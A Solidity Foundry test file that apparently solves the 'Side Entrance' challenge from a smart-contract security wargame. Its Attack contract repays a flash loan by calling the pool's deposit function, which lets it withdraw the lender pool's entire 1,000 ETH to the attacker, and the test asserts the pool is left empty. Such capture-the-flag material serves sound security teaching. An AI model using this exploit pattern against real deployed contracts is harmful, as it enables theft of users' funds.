// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {SideEntranceLenderPool} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool pool;

    constructor(address addr) public {
        pool = SideEntranceLenderPool(addr);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() public {
        pool.withdraw();
    }

    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
    }

    fallback() external payable {}
}

contract SideEntrance is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        Attack attack_obj = new Attack(address(sideEntranceLenderPool));
        console.log(
            "SideEntranceLenderPool balance :",
            address(sideEntranceLenderPool).balance
        );
        console.log("Attacker balance :", attacker.balance);
        console.log("Attack contract balance :", address(attack_obj).balance);
        console.log("Starting attack...");
        attack_obj.attack();
        console.log(
            "SideEntranceLenderPool balance :",
            address(sideEntranceLenderPool).balance
        );
        console.log("Attacker balance :", attacker.balance);
        console.log("Attack contract balance :", address(attack_obj).balance);
        console.log("Withdrawing funds to attacker contract...");
        attack_obj.withdraw();
        console.log(
            "SideEntranceLenderPool balance :",
            address(sideEntranceLenderPool).balance
        );
        console.log("Attacker balance :", attacker.balance);
        console.log("Attack contract balance :", address(attack_obj).balance);
        console.log("Withdrawing funds to attacker account...");
        attack_obj.withdrawFunds();
        console.log(
            "SideEntranceLenderPool balance :",
            address(sideEntranceLenderPool).balance
        );
        console.log("Attacker balance :", attacker.balance);
        console.log("Attack contract balance :", address(attack_obj).balance);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
